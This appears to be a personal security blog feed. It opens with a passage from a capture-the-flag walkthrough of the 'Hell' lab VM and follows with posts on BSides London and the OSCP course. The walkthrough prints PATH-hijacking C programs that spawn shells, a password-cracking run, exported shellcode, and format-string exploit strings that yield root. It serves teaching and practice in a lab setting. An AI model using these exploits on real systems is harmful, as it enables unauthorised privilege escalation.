gpg: key 3F18AB0A: secret key imported
gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x6a;&#x61;&#99;&#107;&#64;&#99;&#111;&#x77;&#x6c;&#x6f;&#118;&#x65;&#114;&#115;&#46;&#99;&#x6f;&#109;">&#106;&#x61;&#99;&#x6b;&#64;&#x63;&#x6f;&#119;&#x6c;&#x6f;&#118;&#x65;&#x72;&#x73;&#x2e;&#x63;&#x6f;&#x6d;</a>&rdquo; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
$ gpg -o email.txt /var/mail/jack/received/message.eml</p>

<p>You need a passphrase to unlock the secret key for
user: &ldquo;<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#106;&#x61;&#99;&#x6b;&#64;&#99;&#x6f;&#119;&#108;&#111;&#118;&#101;&#x72;&#x73;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#97;&#99;&#107;&#x40;&#x63;&#111;&#x77;&#108;&#x6f;&#x76;&#101;&#x72;&#115;&#x2e;&#99;&#x6f;&#109;</a>&rdquo;</p>

<p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>

<p>Enter passphrase: g0tmi1k69
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
      &ldquo;<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x6a;&#x61;&#99;&#107;&#64;&#x63;&#x6f;&#119;&#x6c;&#111;&#118;&#x65;&#114;&#x73;&#x2e;&#x63;&#111;&#x6d;">&#106;&#97;&#x63;&#107;&#x40;&#x63;&#x6f;&#x77;&#x6c;&#111;&#x76;&#x65;&#x72;&#x73;&#x2e;&#x63;&#x6f;&#x6d;</a>&rdquo;
gpg: WARNING: message was not integrity protected
$ cat email.txt
Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>

<p>The password is &lsquo;4J0WWvL5nS&rsquo;
[/plain]</p>

<p>Thank you, Jack, for being a predictable - yet persistent - weirdo. A quick hop and a skip over to the worryingly named milk_4_life account and we can carry on.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ su milk_4_life
Password: 4J0WWvL5nS</p>

<p>$ whoami
milk_4_life
$ [/plain]</p>

<hr />

<h2>I Want to Play a Game, But No Jigsaws, OK ?!</h2>

<p>The home folder for milk_4_life is pretty sparse, just a binary called &ldquo;game&rdquo;. However, it&rsquo;s owned by the george user, and has the suid attribute set.</p>

<p>[plain gutter=&ldquo;false&rdquo;]$ ls -l
total 20
&mdash;s&ndash;x&ndash;x 1 george      george      5743 Jun 19 18:24 game[/plain]</p>

<p>Running the binary produces the following output, which doesn&rsquo;t tell us much other than it&rsquo;s &ldquo;listening&rdquo;. Like a overly intrusive neighbour.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./game
I&rsquo;m listening[/plain]</p>

<p>Netstat isn&rsquo;t available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ss -lp
State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
LISTEN      0      50        127.0.0.1:mysql       <em>:</em>
LISTEN      0      128       :::sunrpc             :::<em>
LISTEN      0      128       </em>:sunrpc              <em>:</em>
LISTEN      0      128       :::http               :::<em>
LISTEN      0      128       :::38035              :::</em>
LISTEN      0      128       <em>:35380               </em>:<em>
LISTEN      0      128       :::ssh                :::</em>
LISTEN      0      128       <em>:ssh                 </em>:<em>
LISTEN      0      10        </em>:1337                <em>:</em>
LISTEN      0      20        ::1:smtp              :::<em>
LISTEN      0      20        127.0.0.1:smtp        </em>:<em>
LISTEN      0      10        </em>:666                 <em>:</em>[/plain]</p>

<p>Connecting to the port from another session asks us to type &ldquo;START&rdquo; to begin. It&rsquo;s more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ telnet 127.0.0.1 1337
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
Type &lsquo;START&rsquo; to begin</p>

<p>banana
No&hellip; START. S-T-A-R-T</p>

<p>Connection closed by foreign host.[/plain]</p>

<p>OK, enough messing around, let&rsquo;s see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I&rsquo;m not answering any of these correctly !</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ telnet 127.0.0.1 1337
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
Type &lsquo;START&rsquo; to begin</p>

<p>START
Starting&hellip;</p>

<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>

<p>Quick what&rsquo;s&hellip; 924 x 541? Umm
Quick what&rsquo;s&hellip; 982 x 21? No idea
Quick what&rsquo;s&hellip; 194 x 542? Really ?
Quick what&rsquo;s&hellip; 679 x 733? WHY WOULD I NEED TO KNOW THIS !?
Quick what&rsquo;s&hellip; 960 x 248? I give up.
Quick what&rsquo;s&hellip; 718 x 646? THANKS OBAMA !
Quick what&rsquo;s&hellip; 162 x 784? ^C
Connection closed by foreign host[/plain]</p>

<p>Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on &ldquo; x &rdquo; to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !</p>

<p>[python]</p>

<h1>!/usr/bin/python</h1>

<p>import socket
import re</p>

<p>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((&lsquo;127.0.0.1&rsquo;,1337)) # hardcoded IP address
s.recv(1024)
s.send(&lsquo;START\n&rsquo;) # login procedure
s.recv(110)
while True:
    d = s.recv(200)
    l = re.findall(r&#8221;Quick what&rsquo;s&hellip; (.*?)\?&ldquo;, d)
    if not l:
        print d
        break
    (a,b) = l[0].split(&lsquo; x &rsquo;)
    mul = int(a) * int(b)
    print str(mul)
    s.send(str(mul)+&lsquo;\n&rsquo;)</p>

<p>print s.recv(1024)
s.close()[/python]</p>

<p>Running it produces a sense of authority over our robot overlords - I&rsquo;m gaming the game.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ python gamey3.py
125451
150858
498300
493353
60564
<strong><strong> SNIP </strong></strong>
174386
841312
53636
Final Score: 412619</p>

<p>!<em>!</em>!<em>!</em>! Congratulations, new high score (412619) !<em>!</em>!<em>!</em>!</p>

<p>I hear the faint sound of chmodding&hellip;&hellip;.[/plain]</p>

<p><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png" alt="high_score_320x320" /></p>

<p>It seems that the binary performs an action when the highscore is beaten. I&rsquo;m not sure what it chmods, but I wonder if we can play this game at it&rsquo;s own game and make it run a bogus binary. There&rsquo;s a distinct possibility the code is relying on the PATH environment variable and just calling system(&ldquo;chmod file&rdquo;) rather than using an absolute path.</p>

<p>So, a bogus chmod binary is created using the following source, compiled, placed in /tmp on the VM and made executable (do I need to show you how to do this ? No ? Good. Saves me the typing.)</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1000 );
 system(&ldquo;id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}[/c]</p>

<p>The path environment variable is modified to make /tmp the first location checked</p>

<p>[plain gutter=&ldquo;false&rdquo;]$ PATH=/tmp:$PATH
$ export | grep PATH
export PATH=&lsquo;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&rsquo;
[/plain]</p>

<p>So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I&rsquo;m not going to show you again, just scroll up if you want to see what it looks like).</p>

<p>The score is beaten and we are indeed dropped to a new shell as the george user.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./game
I&rsquo;m listening
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$
[/plain]</p>

<p><img src="http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif" alt="" /></p>

<hr />

<h2>Tales from the Crypt, But First I&rsquo;ll Rock You</h2>

<p>George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn&rsquo;t recommended any more - he should be using something else.  <em>shakes fist at the NSA</em></p>

<!-- more -->


<p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~$ truecrypt &ndash;mount container.tc
Enter mount directory [default]:
Enter password for /home/george/container.tc:
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:
No password or keyfile specified.[/plain]</p>

<p>Looking around a bit more, it looks like George has also signed up for RockYou</p>

<p>[plain gutter=&ldquo;false&rdquo;]
From: <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#97;&#x64;&#109;&#x69;&#x6e;&#64;&#114;&#111;&#x63;&#107;&#x79;&#111;&#x75;&#x2e;&#x63;&#x6f;&#109;">&#97;&#100;&#x6d;&#x69;&#110;&#64;&#x72;&#x6f;&#x63;&#x6b;&#x79;&#x6f;&#x75;&#x2e;&#99;&#111;&#x6d;</a>
To: <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#x73;&#117;&#x70;&#101;&#x72;&#x5f;&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#104;&#101;&#108;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x73;&#x75;&#112;&#101;&#114;&#95;&#97;&#100;&#x6d;&#105;&#110;&#64;&#x68;&#x65;&#108;&#108;&#46;&#x63;&#111;&#109;</a>
Subject: Account Activation
Date: 13th November 2009</p>

<p>Thanks for signing up for your account. I hope you enjoy our services. [/plain]</p>

<p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
G:\Downloads\oclHashcat-1.21>oclHashcat64.exe -m 6211 -a 0 &ldquo;g:\downloads\container.tc&rdquo; g:\Downloads\dictionaries\catted\rockyou.txt</p>

<p>g:\downloads\container.tc:letsyouupdateyourfunnotesandmore</p>

<p>Session.Name&hellip;: oclHashcat
Status&hellip;&hellip;&hellip;: Cracked
Input.Mode&hellip;..: File (g:\Downloads\dictionaries\catted\rockyou.txt)
Hash.Target&hellip;.: File (g:\downloads\container.tc)
Hash.Type&hellip;&hellip;: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started&hellip;: Sat Jul 12 23:06:15 2014 (17 secs)
Speed.GPU.#1&hellip;:    29889 H/s
Recovered&hellip;&hellip;: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress&hellip;&hellip;.: 496641/14343296 (3.46%)
Skipped&hellip;&hellip;..: 0/496641 (0.00%)
Rejected&hellip;&hellip;.: 1/496641 (0.00%)
HWMon.GPU.#1&hellip;: 97% Util, 56c Temp, 32% Fan</p>

<p>Started: Sat Jul 12 23:06:15 2014
Stopped: Sat Jul 12 23:06:37 2014[/plain]</p>

<p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~$ truecrypt &ndash;mount container.tc
Enter mount directory [default]: ./tc
Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:</p>

<p>george@hell:~$ cd tc
george@hell:~/tc$ ls -l
total 2
-rwx&mdash;&mdash; 1 george george 1679 Jul  5 20:01 id_rsa
george@hell:~/tc$ [/plain]</p>

<p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~/tc$ ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#98;&#97;&#122;&#122;&#x61;&#x40;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#x62;&#x61;&#x7a;&#x7a;&#x61;&#x40;&#49;&#50;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;</a> -i ./id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 13 21:18:28 2014 from 192.168.0.102
$ whoami
bazza[/plain]</p>

<p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>

<hr />

<h2>Bazza&rsquo;s Blockade</h2>

<p>Once again we&rsquo;re presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look</p>

<p>[c]int <em>_cdecl main()
{
  int result; // eax@6
  </em>BYTE v1[3]; // [sp+19h] [bp-417h]@3
  FILE <em>v2; // [sp+424h] [bp-Ch]@1
  const char </em>v3; // [sp+428h] [bp-8h]@1
  const char *v4; // [sp+42Ch] [bp-4h]@1</p>

<p>  v4 = &ldquo;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n&rdquo;;
  v3 = &ldquo;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n&rdquo;;
  printf(&ldquo;Checking integrity of part2&hellip;&rdquo;);
  v2 = popen(&ldquo;sha256sum /home/bazza/part2&rdquo;, &ldquo;r&rdquo;);
  if ( !v2 )
    puts(&ldquo;Failed to run command&rdquo;);
  fgets(v1, 1034, v2);
  if ( strcmp(v1, v4) )
  {
    puts(&ldquo;Uh oh&hellip;. Corrupted or in wrong directory (/home/bazza/)\n&rdquo;);
    result = 0;
  }
  else
  {
    puts(&ldquo; Done!!\n&rdquo;);
    printf(&ldquo;Checking integrity of calling target&hellip;&rdquo;);
    v2 = popen(&ldquo;sha256sum /usr/bin/id&rdquo;, &ldquo;r&rdquo;);
    if ( !v2 )
      puts(&ldquo;Failed to run command&rdquo;);
    fgets(v1, 1034, v2);
    if ( strcmp(v1, v3) )
    {
      puts(&ldquo;Target corrupt\n&rdquo;);
      result = 0;
    }
    else
    {
      puts(&ldquo; Done!!\n\nBinary and target confirmed.&rdquo;);
      system(&ldquo;/home/bazza/part2&rdquo;);
      pclose(v2);
      result = 0;
    }
  }
  return result;
}[/c]</p>

<p>OK, so part1 runs part2 (this time with an absolute path), so time for a quick peek into part2</p>

<p>[c]int <strong>cdecl main()
{
  </strong>gid_t v0; // eax@2
  int result; // eax@2</p>

<p>  if ( getegid() == 1003 )
  {
    puts(&ldquo;\nCan&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>&rdquo;);
    system(&ldquo;id&rdquo;);
    result = 0;
  }
  else
  {
    v0 = getegid();
    printf(&ldquo;\n\nError! %d ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1!\n&rdquo;, v0);
    result = 0;
  }
  return result;
}[/c]</p>

<p>So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Error! 1004 ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1![/plain]</p>

<p>Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn&rsquo;t seem to drop us to a shell as that user (oj)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
bazza[/plain]</p>

<p>A further look into the source code for part2 shows that it is not using an absolute path for the system(&ldquo;id&rdquo;) function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I&rsquo;m using uid 1005 rather than 1000.</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1005 );
 system(&ldquo;/usr/bin/id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}[/c]</p>

<p>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last time and we&rsquo;re good to go.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
oj
[/plain]</p>

<p>Success !</p>

<p>Nearly there, only this hoop to jump through and we&rsquo;re done.</p>

<hr />

<h2>Orange Juice Doesn&rsquo;t Echo</h2>

<p>The OJ user has 1 file, a binary called echo which does exactly that, it repeats what you send it. This guy is the height of programming ability. There&rsquo;s got to be something wrong with it.</p>

<!-- more -->


<p>A quick look at the binary in IDA, and yes there is something wrong with it, there seems to be something in it that is called a &ldquo;format string vulnerability&rdquo;.</p>

<p><img src="https://pmpaspeakingofprecision.files.wordpress.com/2014/07/confused-child.jpg" alt="" /></p>

<p>wut ?</p>

<p>What felt like 12 days of reading, and video watching (Fuzzy Security videos are the best - check <a href="https://www.youtube.com/watch?v=NwzmYSlETI8">this one out for formatstr vuln explanation</a> and the <a href="https://www.youtube.com/watch?v=CHrs30g-3O0">follow up</a>) I still felt none the wiser.  But I figured I&rsquo;d give it a go anyway.  What&rsquo;s the worst that can happen ?  I can&rsquo;t make it any more wrong now can I ?</p>

<p>Meh, let&rsquo;s put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we&rsquo;re progressing.</p>

<p>[plain gutter=&ldquo;false&rdquo;]export SHELLCODE=$(python -c &lsquo;print &ldquo;\x90&rdquo; * 1000 + &ldquo;\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41&rdquo;&rsquo;)[/plain]</p>

<p>So, I started to play around with gdb and format strings.
There are several ways you can do format string vulnerabilities - you can put your shellcode in memory using an environment variable, then overwrite a global offset table entry to execute your code (as per the videos), or if you&rsquo;re unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that&hellip; it didn&rsquo;t work because my shellcode kept moving in memory.</p>

<p><img src="http://media.tumblr.com/201153f420ed4a2ca50fadbcfabacce3/tumblr_inline_n1mltcP4Bf1ss9nq4.gif" alt="" /></p>

<p>Apparently, though, you can overwrite entries in the .dtor part of the binary - don&rsquo;t ask me what .dtor is, but I had great fun gradually overwriting random memory locations and crashing the application over and over and over again&hellip;</p>

<p>Here are some of the format strings I fabricated while on my journey - you can get an idea of my thought pattern and the things I tested.  It&rsquo;s also pretty obvious when I went back to basics about 7 attempts in.</p>

<p>[plain]
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%116\$n
$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)-%64362u-%117\$n.
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%64362u-%119\$n.
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo; + &ldquo;\x5e\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%4\$n-%5\$n
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%116\$n.
$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)%117\$x
%64364u$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%119\$n.
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217u%119\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABB-%00001c%116\$.x%00001c%114\$.x
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%113\$hn%15217c%112\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%118\$hn%15217u%117\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217c%119\$hn
[/plain]</p>

<p>I spent a lot of time staring at segfault after segfault until I stumbled upon this random combination of characters (I really really want to explain how I worked it out, but I&rsquo;m not 100% sure myself. I guess that&rsquo;s a follow up post sometime. Also, it is possible this wont work for you).</p>

<p>[plain]
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn[/plain]</p>

<p>Which when executed like this</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ /home/oj/echo $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn[/plain]</p>

<p>dropped me to a shell.</p>

<p>[plain gutter=&ldquo;false&rdquo;]</p>

<h1>id</h1>

<p>uid=0(root) gid=1005(oj) groups=0(root),1005(oj)</p>

<h1>whoami</h1>

<p>root</p>

<h1>cat /root/flag.txt</h1>

<p>Congratulations of beating Hell.</p>

<p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.</p>

<p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</p>

<p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de</p>

<h1>[/plain]</h1>

<p><img src="http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif" alt="" /></p>

<p>Like a baws.  Now I&rsquo;m going to exorcise the VM and purge every last shred of it from my SSD.  BEGONE FOUL DEMON !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides London - A Retrospective]]></title>
    <link href="http://recrudesce.github.io/blog/2014/04/29/bsides-london-a-retrospective/"/>
    <updated>2014-04-29T21:23:22+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/04/29/bsides-london-a-retrospective</id>
    <content type="html"><![CDATA[<p>BSides London, BSides London&hellip; what can I say about BSides London&hellip;
Well, for one it&rsquo;s small - if you&rsquo;re expecting a massive convention like Defcon you will be sorely disappointed. But the size doesn&rsquo;t matter when you get to meet revered infosec people like <a href="https://twitter.com/jack_daniel">Jack Daniel</a> (Tenable) , <a href="https://twitter.com/mckeay">Martin McKeay</a>, <a href="https://twitter.com/todb">Tod Beardsley</a> (Metasploit) et al and talk to them on a one to one level about anything (I had a conversation about Hello Kitty with Tod B - that says a lot). Oh, and don&rsquo;t forget the fact that staff members from the ever so epic Offensive Security were there too - I&rsquo;m looking at you <a href="https://twitter.com/g0tmi1k">g0tmi1k</a> :D It was also nice to meet up with <a href="https://twitter.com/NullMode_">Nullmode</a> (forever known as N0tmi1k) and <a href="https://twitter.com/arr0way">Arr0way</a> as well and chat randomly about anything and everything that came to mind.</p>

<!-- more -->


<p>The talks were brilliant and well organised, and the lock picking village allowed me to get my first taste in lock picking - I think I&rsquo;ve gotten the bug now and have already ordered my first set of picks and practice locks. I wasn&rsquo;t able to get to as many talks as I&rsquo;d have liked, but that wasn&rsquo;t an issue due to the people around me who were happy to impart their knowledge and answer any questions asked.</p>

<p>And Tod, if I see any weird transactions on my credit card in the next few days, I know who I&rsquo;m going to ask ;)</p>

<p>The only slight issue with the day was not related to BSides at all - but it was due to the Tube Strike. I&rsquo;d like to extend a personal thank you to all the TFL members of staff who continued to come to work today and assist in keeping London moving at a moderate, but slightly slower, pace than usual. I will not repeat what went through my mind as I walked down onto the platform at Earls Court only to see thousands of people - I couldn&rsquo;t see one inch of the platform ! At no point did I come across a staff member who was nothing but polite and level headed about the whole situation.</p>

<p>After sitting on the floor of a very busy train for the nearly two hour journey home, I was able to reflect on the introduction I&rsquo;d been given to the infosec industry; I mean I&rsquo;m a novice - I&rsquo;ve only been seriously thinking about this as a career path for around a year, if that. There&rsquo;s a lot of people talking about Infosec Burnout at the moment, but I saw nothing of the sort. All I experienced were people who went out of their way to run and attend an event for other like minded people in the industry. Those people pulled out all the stops to make BSides London welcoming, friendly and a lot of fun. I hope the Burnout mentality is just a phase and that it passes quickly so we can continue to host events of this stature.</p>

<p>Here&rsquo;s to next year - and here&rsquo;s to BSides London getting bigger and better.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSidesLondon and Infosec]]></title>
    <link href="http://recrudesce.github.io/blog/2014/04/24/bsideslondon-and-infosec/"/>
    <updated>2014-04-24T11:17:02+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/04/24/bsideslondon-and-infosec</id>
    <content type="html"><![CDATA[<p>With less than a week to go before <a href="https://www.securitybsides.org.uk">BSides London</a> and <a href="http://www.infosec.co.uk">Infosec 2014</a>, I&rsquo;m trying to list out all the people/companies I want to talk to, and also determine whether to take my laptop or my tablet - I&rsquo;m thinking laptop&hellip;</p>

<p>Anyway, quick and simple post this one - I&rsquo;ll be at both events.  You can tweet me <a href="https://twitter.com/recrudesce">@recrudesce</a> if you want to meet up and say &ldquo;hi&rdquo;.</p>

<p>If you&rsquo;re going too, have a good time - remember to get loads of swag ;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OSCP Review]]></title>
    <link href="http://recrudesce.github.io/blog/2014/04/20/oscp-review/"/>
    <updated>2014-04-20T17:11:33+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/04/20/oscp-review</id>
    <content type="html"><![CDATA[<p>Have you ever purposefully put yourself in a situation that makes you run around the house in glee, and then five minutes later makes you want to put your head through a door ?  No ?  Maybe you should try OSCP.  If being constantly told to &ldquo;try harder&rdquo; doesn&rsquo;t make you want to embed a brick into your eye socket, then maybe this is for you&hellip;</p>

<p>After much research into the Certified Ethical Hacker course, the term &ldquo;OSCP&rdquo; kept cropping up in my google searches.  OSCP&hellip; OSCP&hellip;  what is this mythical OSCP of which you speak !?</p>

<!-- more -->


<p>Offensive Security Certified Professional.  Possibly one of the most intensive self learning course I&rsquo;ve had the privilege of spending my hard earned cash on.  The only course that gives you a full lab environment to compromise - with no less than 50 VM&rsquo;s of varying shapes, sizes, OS and vulnerability levels.  Ranging from simple boxes that can be compromised with a cough, to boxes that make you tear your hair out for days while looking for a route in.  I am not allowed to go into detail about the labs, or individual machines, but I can tell you there are some absolute brain teasers in there.</p>

<p>So, lets rewind a bit.  Personally, I&rsquo;ve not really spent that much time using applications like Metasploit or similar.  I&rsquo;ve got a fair amount of computer and network knowledge, plus a logical mind - how hard can the course be ?  I read up on people&rsquo;s experiences and it seemed to be the course for me (I have no significant other, or kids, therefore I could spend 6 hours every evening sat in front of my laptop - like a real hacker !), so I pulled out the ol&#8217; BarclayCard and signed up.  Now I was into the waiting game.  You have to choose a starting date, on which you&rsquo;ll receive an email providing course materials (more on that in a sec) and VPN configuration.</p>

